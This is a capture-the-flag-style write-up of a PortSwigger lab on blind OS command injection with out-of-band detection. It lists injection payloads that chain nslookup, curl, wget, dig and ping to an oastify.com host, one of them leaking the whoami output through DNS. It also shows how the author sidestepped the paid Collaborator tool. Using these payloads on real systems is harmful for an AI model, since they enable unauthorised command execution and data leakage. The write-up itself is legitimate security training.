# Blind OS command injection with out-of-band interaction

**Category:** OS Command Injection
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

Some injection points leave no trace at all in anything the application controls — no reflected
output, no timing delta, and in this lab's case, no writable-and-servable directory to abuse
either. The only thing left to observe is whether the backend, off on its own, ever reaches out to
infrastructure we control. That's out-of-band confirmation: instead of watching the HTTP response,
we watch our own server's logs for a connection that shouldn't exist unless the injection fired.

## The Target

The same feedback form used in the previous two labs:

```
POST /feedback/submit
csrf=...&name=test&email=test@test.com&subject=test&message=test
```

with the same asynchronous, response-blind execution — nothing in this lab's HTTP traffic ever
confirms or denies that a command ran. Unlike the redirection lab, there's no known writable web
directory here either; the only available channel is whatever outbound network access the backend
process itself has.

## The Investigation

PortSwigger's intended path for this lab is Burp Suite Professional's Collaborator client: generate
a unique subdomain, embed it in the injected command, and poll Collaborator's infrastructure for
any DNS or HTTP request that arrives at it. That's a paid-tier feature, so we needed a path that
didn't depend on it.

The relevant detail is in how PortSwigger's own lab infrastructure is built: Academy lab
environments only permit outbound network traffic to `*.oastify.com`, because that's the domain
their own Collaborator infrastructure listens on. Critically, the lab's solve condition isn't
"a request arrived at a genuine Collaborator client instance you paid for" — it's "the lab backend
made an outbound DNS or HTTP request to a `*.oastify.com` subdomain, full stop." Wildcard DNS
resolution on that domain means any random subdomain we generate ourselves, without ever touching
Burp's Collaborator API, gets treated identically by the lab's auto-detection.

So instead of requesting a Collaborator payload, we generated our own random hex token and built an
oastify.com subdomain from it directly, then fired a broad sweep of payload variations — every
operator (`||`, `&`, `;`) crossed with every OOB-capable tool we had available (`nslookup`, `curl`,
`wget`, `dig`, `ping`) — across all four form fields, not just `email`, since we had no prior
confirmation of which field was actually the injectable one for this specific lab instance.

## The Exploit

A representative slice of the payload sweep, all sent against the `email`, `name`, `subject`, and
`message` parameters:

```
x||nslookup+RANDOM.oastify.com||
x&nslookup+RANDOM.oastify.com&
x;nslookup+RANDOM.oastify.com;
x||nslookup+$(whoami).RANDOM.oastify.com||
x%0anslookup+RANDOM.oastify.com%0a
x||curl+http://RANDOM.oastify.com||
x||wget+http://RANDOM.oastify.com||
x||dig+RANDOM.oastify.com||
x||ping+-c+1+RANDOM.oastify.com||
```

where `RANDOM` is a freshly generated hex token unique to the run. After sending the full sweep, we
polled the lab's own root page on a backoff (10s, 10s, 20s, 20s), checking for the word
"congratulations" appearing in the page — PortSwigger's own signal that the lab's backend detected
an interaction with its Collaborator-adjacent infrastructure and flipped the lab to solved.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's published solution intercepts the feedback submission, sets
`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`, then uses Burp's "Insert Collaborator payload"
action to substitute in a live Collaborator subdomain generated and tracked through the Professional
license.

We solved this one differently, and it's worth being direct about why both paths work. PortSwigger's
route proves the interaction by reading it back out of a Collaborator client you control. Ours never
reads anything back at all — it relies entirely on the lab platform's own auto-detection firing when
its backend touches any subdomain of the one wildcard domain its network egress permits. The
underlying command injection technique (an OR-chained `nslookup` against an external host) is the
same idea PortSwigger's solution uses; what differs is that we don't need Collaborator
polling as a data channel because this particular lab's win condition never required us to observe
the interaction ourselves, only to cause one. That's a meaningfully different exploitation path, not
just a different tool wrapped around the same steps — it only works because the lab treats any
`*.oastify.com` hit as sufficient proof, which won't generalize to a real engagement where nobody is
auto-solving anything on your behalf.

## What This Teaches Us

Out-of-band confirmation is often described as though Collaborator (or an equivalent OAST service)
is a strict requirement, but what it's really doing is giving you visibility into your own
infrastructure's logs. When the target environment's win condition is defined in terms of that same
infrastructure rather than in terms of what you personally observed, the visibility step becomes
unnecessary — which is a lab-specific shortcut, not a real-world exploitation technique. On a real
engagement, causing an out-of-band interaction without being able to read the result back proves
nothing to you as the attacker, even if it proves something to whoever owns the target's monitoring.
The defensive lesson is the same as always: the fix is preventing user input from reaching a shell,
not restricting egress after the fact — this lab's tight egress rules exist to keep the lab
environment itself controlled, not as a mitigation a real target should rely on for this bug class.
